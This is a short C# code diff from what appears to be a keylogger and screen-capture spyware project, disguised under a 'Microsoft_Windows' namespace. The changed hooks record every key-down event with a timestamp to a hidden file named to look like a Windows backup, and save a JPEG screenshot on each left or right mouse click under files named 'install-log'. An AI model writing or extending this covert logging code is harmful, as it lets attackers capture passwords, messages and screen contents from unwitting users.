@@ -51,18 +51,28 @@ namespace Microsoft_Windows
             }, null, startTimeSpan, periodTimeSpan);
 
 
-            keyboardWatcher.OnKeyInput += (s, e) =>
-            {
-                string time = string.Format("{0:yyyyMMdd HH:mm:ss.fff tt}", DateTime.Now);
-                File.AppendAllText("C:\\WindowsData\\windows10\\backup", time + " - " + e.KeyData.Keyname + Environment.NewLine);
-                // Debug.WriteLine("Key {0} event of key {1}", e.KeyData.EventType, e.KeyData.Keyname);
+            keyboardWatcher.OnKeyInput += (s, e) =>{
+
+                if (String.Equals(e.KeyData.EventType.ToString(), "down")) {
+                    string time = string.Format("{0:yyyyMMdd HH:mm:ss.fff tt}", DateTime.Now);
+                    File.AppendAllText("C:\\WindowsData\\windows10\\backup", time + " - " + e.KeyData.Keyname + Environment.NewLine);
+                    //Debug.WriteLine("Key {0} event of key {1}", e.KeyData.EventType, e.KeyData.Keyname);
+                }
             };
 
             
-            mouseWatcher.OnMouseInput += (s, e) =>
-            {
-                if (String.Equals(e.Message.ToString(), "WM_LBUTTONDOWN")) { ps.CaptureScreenToFile(di + "\\install-log" + currentFileValue, System.Drawing.Imaging.ImageFormat.Jpeg); currentFileValue++; }
-                if (String.Equals(e.Message.ToString(), "WM_RBUTTONDOWN")) { ps.CaptureScreenToFile(di + "\\install-log" + currentFileValue, System.Drawing.Imaging.ImageFormat.Jpeg); currentFileValue++; }
+            mouseWatcher.OnMouseInput += (s, e) =>{
+
+                if (String.Equals(e.Message.ToString(), "WM_LBUTTONDOWN")) {
+                    ps.CaptureScreenToFile(di + "\\install-log" + currentFileValue, System.Drawing.Imaging.ImageFormat.Jpeg);
+                    currentFileValue++;
+                }
+
+                if (String.Equals(e.Message.ToString(), "WM_RBUTTONDOWN")) {
+                    ps.CaptureScreenToFile(di + "\\install-log" + currentFileValue, System.Drawing.Imaging.ImageFormat.Jpeg);
+                    currentFileValue++;
+                }
+
                 // if (String.Equals(e.Message.ToString(), "WM_MOUSEMOVE")) { Debug.WriteLine("XXXXXXXXXXXXXXXXXXXXXXXXX"); }
                 //  Debug.WriteLine("Mouse event {0} at point {1},{2}", e.Message.ToString(), e.Point.x, e.Point.y);
             };
